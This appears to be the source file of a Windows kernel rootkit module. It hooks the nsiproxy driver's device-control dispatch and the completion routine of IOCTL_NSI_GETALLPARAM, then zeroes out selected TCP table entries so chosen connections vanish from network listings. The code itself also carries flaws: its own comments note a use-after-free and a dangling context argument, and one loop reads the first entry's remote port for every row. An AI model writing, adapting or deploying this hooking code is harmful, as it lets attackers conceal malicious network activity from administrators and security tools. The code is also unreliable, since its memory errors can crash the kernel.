#include <ntifs.h>
#include "NetworkHook.h"

PDRIVER_OBJECT NsiHook::g_NetNSIProxyDriverObject = nullptr;
PDRIVER_DISPATCH NsiHook::g_NetOldNSIProxyDeviceControl = nullptr;

USHORT NsiHook::htons(USHORT a)
{
	USHORT b = a;
	b = (b << 8);
	a = (a >> 8);
	return (a | b);
}

NTSTATUS NsiHook::NetHookNSIProxy()
{
	UNICODE_STRING NsiDriverName = RTL_CONSTANT_STRING(L"\\Driver\\nsiproxy");

	KdPrint(("Hooking NsiProxy..\n"));

	NTSTATUS status = ObReferenceObjectByName(
		&NsiDriverName,
		OBJ_CASE_INSENSITIVE,
		nullptr,
		0,
		*IoDriverObjectType,
		KernelMode,
		nullptr,
		(PVOID*)(&g_NetNSIProxyDriverObject));
	if (!NT_SUCCESS(status))
	{
		KdPrint(("ObReferenceObjectByName Faileed. Failed to find nsiproxy! (0x%08X)\n", status));
		return status;
	}

	if (g_NetOldNSIProxyDeviceControl == nullptr)
	{
		g_NetOldNSIProxyDeviceControl = g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

		if (g_NetOldNSIProxyDeviceControl == nullptr)
		{
			KdPrint(("Missing NSIProxy Handler\n"));
			return STATUS_SUCCESS;
		}
	}

	//perform IRP hook
// #pragma warning(suppress : 4311)
// #pragma warning(suppress : 4302)
	InterlockedExchange64(
		(LONG64*)&g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
		(LONG64)NetNSIProxyDeviceControlHook
	);

	return STATUS_SUCCESS;
}

BOOLEAN NsiHook::NetNSIFreeHook()
{
	if (g_NetOldNSIProxyDeviceControl)
	{
		InterlockedExchange64(
			(LONG64*)&g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
			(LONG64)g_NetOldNSIProxyDeviceControl
		);

		//decrease reference count of hooked driver
		ObDereferenceObject(g_NetNSIProxyDriverObject);

		return TRUE;
	}

	return FALSE;
}

static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, USHORT foreignPort, ULONG cforeignIP)
{
	union
	{
		USHORT port;
		UCHAR portbytes[2];
	}port;

	ULONG localbytes[4];
	localbytes[0] = localIP & 0xFF;
	localbytes[1] = (localIP >> 8) & 0xFF;
	localbytes[2] = (localIP >> 16) & 0xFF;
	localbytes[3] = (localIP >> 24) & 0xFF;
	port.port = 0;
	port.portbytes[0] = (localPort >> 8) & 0xFF;
	port.portbytes[1] = localPort & 0xFF;
	DbgPrint("%d.%d.%d.%d:%d\t", localbytes[0], localbytes[1], localbytes[2], localbytes[3], port.port);


	ULONG foreignbytes[4];
	foreignbytes[0] = foreignIP & 0xFF;
	foreignbytes[1] = (foreignIP >> 8) & 0xFF;
	foreignbytes[2] = (foreignIP >> 16) & 0xFF;
	foreignbytes[3] = (foreignIP >> 24) & 0xFF;

	port.port = 0;
	port.portbytes[0] = (foreignPort >> 8) & 0xFF;
	port.portbytes[1] = foreignPort & 0xFF;
	DbgPrint("%d.%d.%d.%d:%d\t", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3], port.port);

	ULONG cforeignbytes[4];
	cforeignbytes[0] = cforeignIP & 0xFF;
	cforeignbytes[1] = (cforeignIP >> 8) & 0xFF;
	cforeignbytes[2] = (cforeignIP >> 16) & 0xFF;
	cforeignbytes[3] = (cforeignIP >> 24) & 0xFF;
	DbgPrint("%d.%d.%d.%d\n", cforeignbytes[0], cforeignbytes[1], cforeignbytes[2], cforeignbytes[3]);
}

NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context)
{
	KAPC_STATE ApcState{};
	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

	PNSI_STRUCTURE_1 NsiStructure1 = (PNSI_STRUCTURE_1)Irp->UserBuffer;
	if (!MmIsAddressValid(NsiStructure1->Entries))
	{
		goto free_exit;
	}

	if (NsiStructure1->EntrySize != sizeof(NSI_STRUCTURE_ENTRY))
	{
		goto free_exit;
	}

	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);

	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiStructure1->Entries;
	PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiStructure1->Entries->EntriesStart[0]);

	for (ULONG i = 0; i < NsiStructure1->NumberOfEntries; i++)
	{
		// PrintIP(NsiBufferEntries[i].IpAddress);
		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP, pTcpEntry->remoteEntry.Port,
			NsiBufferEntries[i].IpAddress);

		// if (NetHook::NetIsHiddenIpAddress(NsiBufferEntries[i].IpAddress)
		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
			pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP))
		{
			RtlZeroMemory(&NsiBufferEntries[i], sizeof(NSI_STRUCTURE_ENTRY));
			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
		}
	}

	KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePoolWithTag(HookedContext, TAG_NET);

	//
	// ERR: There's a use after free here.
	//
	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack{ IoGetCurrentIrpStackLocation(Irp) };
	ULONG io_control_code{ IrpStack->Parameters.DeviceIoControl.IoControlCode };

	if (IOCTL_NSI_GETALLPARAM == io_control_code)
	{
		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength != sizeof(_NSI_STRUCTURE_1))
		{
			KdPrint(("InputBufferLength:%lu sizeof(NSI_STRUCTURE):%lu\n", IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(_NSI_STRUCTURE_1)));
		}

		//if call is relevent hook the CompletionRoutine
		PHOOKED_IO_COMPLETION hook = (PHOOKED_IO_COMPLETION)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HOOKED_IO_COMPLETION), TAG_NET);
		if (hook == nullptr)
		{
			//call the original DeviceIoControl func
			return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
		}

		hook->OriginalCompletionRoutine = IrpStack->CompletionRoutine;
		hook->OriginalContext = IrpStack->Context;

		IrpStack->Context = hook;
		IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutine;

		hook->RequestingProcess = PsGetCurrentProcess();
		hook->InvokeOnSuccess = (IrpStack->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;

		IrpStack->Control |= SL_INVOKE_ON_SUCCESS;
	}

	//call the original DeviceIoControl func
	return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
}